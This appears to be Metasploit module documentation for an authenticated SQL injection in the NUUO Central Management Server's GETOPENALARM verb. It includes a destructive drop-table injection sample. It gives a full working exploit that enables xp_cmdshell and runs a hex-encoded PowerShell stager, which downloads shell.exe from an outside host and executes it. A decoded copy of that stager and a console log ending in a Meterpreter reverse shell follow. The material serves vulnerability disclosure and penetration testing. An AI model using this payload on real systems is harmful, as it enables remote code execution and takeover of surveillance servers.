## Description

Nuuo CMS Authenticated SQL injection

The GETOPENALARM verb is used to obtain information about alarms stored in the CMS Server database. An example request is below:

```
GETOPENALARM NUCM/1.0
DeviceID: <number>
SourceServer: <server-id>
LastOne: <number>
```

The vulnerability is in the "SourceServer" parameter, which allows injection of arbitrary SQL characters, and can be abused to inject SQL into the executing statement. For example the following request:

```
GETOPENALARM NUCM/1.0
DeviceID: 1
SourceServer: ';drop table bobby;-- 
LastOne: 3
```

Will cause the following SQL query to be executed on the server:
SELECT AlarmNo, EventType, DeviceID, Channel, EventDesc, DateTime, PreviewImage, SourceServer, AlarmID, State, Priority, Owner, HistoryNo, PosTransaction, AlarmNote, AlarmType FROM AlarmLog WHERE DeviceID=1 AND SourceServer='';drop table bobby;-- ' AND State<20 order by DateTime DESC

Given that SQL Server 2005 Express is used by default (see vulnerability #2), this can be abused to enable xp_cmdshell and achieve remote code execution.

As as example, here is a full working exploit that downloads a reverse shell from http://10.0.99.102/shell.exe and executes it:

```
';exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure; declare @q varchar(8000); select @q=0x78705f636d647368656c6c2027636420433a5c77696e646f77735c74656d705c202626206563686f202473746f726167654469723d24707764203e20776765742e707331202626206563686f2024776562636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e576562436c69656e74203e3e20776765742e707331202626206563686f202475726c203d2022687474703a2f2f31302e302e39392e3130322f7368656c6c2e65786522203e3e20776765742e707331202626206563686f202466696c65203d20227368656c6c2e65786522203e3e20776765742e707331202626206563686f2024776562636c69656e742e446f776e6c6f616446696c65282475726c2c2466696c6529203e3e20776765742e70733120262620706f7765727368656c6c2e657865202d457865637574696f6e506f6c69637920427970617373202d4e6f4c6f676f202d4e6f6e496e746572616374697665202d4e6f50726f66696c65202d46696c6520776765742e70733120262620636d64202f6320433a5c77696e646f77735c74656d705c7368656c6c2e65786527; exec (@q);-- 
```

The encoded part of the exploit is the following:

```
xp_cmdshell 'cd C:\windows\temp\ && echo $storageDir=$pwd > wget.ps1 && echo $webclient = New-Object System.Net.WebClient >> wget.ps1 && echo $url = "http://10.0.99.102/shell.exe" >> wget.ps1 && echo $file = "shell.exe" >> wget.ps1 && echo $webclient.DownloadFile($url,$file) >> wget.ps1 && powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 && cmd /c C:\windows\temp\shell.exe'
```

## Vulnerable Application

[NUUO Central Management Server (CMS): all versions below 3.1](http://d1.nuuo.com/NUUO/CMS/)

The following versions were tested:

 - 1.5.2 OK
 - 2.1.0 OK
 - 2.3.2 OK
 - 2.4.0 OK
 - 2.6.0 OK
 - 2.9.0 OK
 - 2.10.0 OK

## Scenarios

### Tested on Windows 10 Pro x64 running NCS Server 2.4.0

```
msf5 exploit(windows/nuuo/nuuo_cms_sqli) > set rhosts 172.22.222.200
rhosts => 172.22.222.200
msf5 exploit(windows/nuuo/nuuo_cms_sqli) > set srvhost 172.22.222.136
srvhost => 172.22.222.136
msf5 exploit(windows/nuuo/nuuo_cms_sqli) > exploit

[*] Started reverse TCP handler on 172.22.222.136:4444 
[*] 172.22.222.200:5180 - Starting up our web service on http://172.22.222.136:8080/YxAxhLwOUeKzH ...
[*] 172.22.222.200:5180 - Using URL: http://172.22.222.136:8080/YxAxhLwOUeKzH
[*] 172.22.222.200:5180 - Enabling xp_cmdshell and asking CMS to download and execute http://172.22.222.136:8080/YxAxhLwOUeKzH
[*] 172.22.222.200:5180 - Injecting PowerShell payload
[+] 172.22.222.200:5180 - Sending the payload to CMS...
[*] 172.22.222.200:5180 - Executing shell...
[*] Sending stage (179779 bytes) to 172.22.222.200
[*] Meterpreter session 1 opened (172.22.222.136:4444 -> 172.22.222.200:49681) at 2019-02-19 06:15:35 -0600
[*] 172.22.222.200:5180 - Server stopped.

meterpreter > getuid
Server username: NT Service\MSSQLSERVER
meterpreter > sysinfo
Computer        : DESKTOP-IPOGIJR
OS              : Windows 10 (Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

## References

https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02

https://raw.githubusercontent.com/pedrib/PoC/master/advisories/nuuo-cms-ownage.txt
